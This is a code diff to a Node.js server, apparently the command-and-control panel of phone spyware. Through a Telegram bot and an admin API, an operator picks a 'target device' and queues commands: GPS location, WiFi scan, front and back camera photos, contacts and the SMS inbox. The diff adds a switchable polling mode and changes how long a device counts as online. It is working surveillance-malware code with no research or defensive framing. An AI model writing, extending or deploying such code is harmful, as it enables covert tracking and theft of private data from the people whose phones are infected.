@@ -39,6 +39,7 @@ let db;
         await db.exec(`CREATE TABLE IF NOT EXISTS devices (
             id TEXT PRIMARY KEY, 
             last_seen REAL DEFAULT 0,
+            polling_mode TEXT DEFAULT 'turbo',
             info TEXT
         )`);
 
@@ -85,9 +86,13 @@ app.set('views', path.join(__dirname, 'templates'));
 app.use('/public', express.static(path.join(__dirname, 'public')));
 
 // Helper function
-const updateDeviceSeen = async (deviceId) => {
+const updateDeviceSeen = async (deviceId, mode = null) => {
     const timestamp = Date.now() / 1000;
-    await db.run('INSERT OR REPLACE INTO devices (id, last_seen) VALUES (?, ?)', [deviceId, timestamp]);
+    if (mode) {
+        await db.run('INSERT INTO devices (id, last_seen, polling_mode) VALUES (?, ?, ?) ON CONFLICT(id) DO UPDATE SET last_seen=excluded.last_seen, polling_mode=excluded.polling_mode', [deviceId, timestamp, mode]);
+    } else {
+        await db.run('INSERT INTO devices (id, last_seen) VALUES (?, ?) ON CONFLICT(id) DO UPDATE SET last_seen=excluded.last_seen', [deviceId, timestamp]);
+    }
 };
 
 // Helper: Format Output JSON ke teks yang mudah dibaca (List Mode)
@@ -323,9 +328,10 @@ Format Eksekusi Manual:
 
         const buttons = [];
         devices.forEach(d => {
-            const isOnline = (Date.now() / 1000 - d.last_seen) < 60;
+            const isOnline = (Date.now() / 1000 - d.last_seen) < 90;
             const statusIcon = isOnline ? '🟢' : '🔴';
-            buttons.push([{ text: `${statusIcon} ${d.id}`, callback_data: `select_dev:${d.id}`, style: isOnline ? 'success' : undefined }]);
+            const modeIcon = d.polling_mode === 'short' ? '⚡' : '🔋';
+            buttons.push([{ text: `${statusIcon} ${d.id} [${modeIcon}]`, callback_data: `select_dev:${d.id}` }]);
         });
 
         const caption = '📱 <b>Pilih Target Perangkat:</b>';
@@ -346,7 +352,13 @@ Format Eksekusi Manual:
 
     // Menangani klik dari tombol Device yang dipilih
     const sendDeviceMenu = async (ctx, devId, isSecret = false) => {
+        const device = await db.get('SELECT polling_mode FROM devices WHERE id = ?', [devId]);
+        const currentMode = device?.polling_mode || 'long';
+        const modeLabel = currentMode === 'short' ? '⚡ TURBO' : '🔋 NORMAL';
+        const nextMode = currentMode === 'short' ? 'long' : 'short';
+
         const menuBtns = [
+            [{ text: `📊 Mode: ${modeLabel} (Switch)`, callback_data: `runcmd:${devId}:set_polling_mode ${nextMode}` }],
             [{ text: '📡 Ping', callback_data: `runcmd:${devId}:ping` }, { text: '🎯 Lokasi GPS', callback_data: `runcmd:${devId}:location`, style: 'primary' }, { text: '📶 Scan WiFi', callback_data: `runcmd:${devId}:wifi_scan`, style: 'primary' }],
             [{ text: '📸 Foto (Blkng)', callback_data: `runcmd:${devId}:photo back` }, { text: '🤳 Foto (Depan)', callback_data: `runcmd:${devId}:photo front` }],
             [{ text: '📞 Kontak', callback_data: `runcmd:${devId}:contacts` }, { text: '📩 Inbox SMS', callback_data: `runcmd:${devId}:sms_list` }],
@@ -588,7 +600,7 @@ app.get('/poll', async (req, res) => {
     const { client_id, auth, mode } = req.query;
     if (auth !== AUTH_TOKEN) return res.status(403).json({ error: 'Unauthorized' });
 
-    await updateDeviceSeen(client_id);
+    await updateDeviceSeen(client_id, mode);
 
     const cmd = await db.get('SELECT * FROM commands WHERE device_id = ? AND status = ? ORDER BY created_at ASC LIMIT 1',
         [client_id, 'pending']);
@@ -820,7 +832,8 @@ app.get('/admin/api/devices', async (req, res) => {
         const devicesData = devices.map(d => ({
             id: d.id,
             last_seen: d.last_seen,
-            is_online: (now - d.last_seen) < 60
+            is_online: (now - d.last_seen) < 90,
+            polling_mode: d.polling_mode || 'long'
         }));
         res.json({ devices: devicesData });
     } catch (e) {
